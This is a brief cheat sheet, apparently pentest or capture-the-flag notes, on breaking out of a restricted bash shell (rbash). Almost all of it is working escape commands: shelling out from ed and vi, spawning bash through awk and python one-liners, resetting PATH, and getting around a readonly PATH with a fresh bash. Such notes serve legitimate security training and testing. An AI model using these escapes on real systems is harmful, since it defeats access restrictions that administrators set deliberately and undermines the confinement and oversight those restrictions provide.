# rbash Escape via Text Editor

`rbash` restricts `cd`, PATH changes, and running binaries outside the allowed path.  
Text editors that can execute shell commands bypass it.

**ed:**
```bash
ed
!bash
# then: export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**vim / vi** (if in PATH):
```bash
vi
:set shell=/bin/bash
:shell
```

**nano** — doesn't exec shell commands by default; check for older versions with `^R^X`.

**awk / python / perl** (if accessible):
```bash
awk 'BEGIN {system("/bin/bash")}'
python -c 'import os; os.system("/bin/bash")'
```

After escaping, fix PATH immediately:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Also check `.bashrc` for `readonly PATH` — if set, use `exec bash --noprofile --norc` instead.
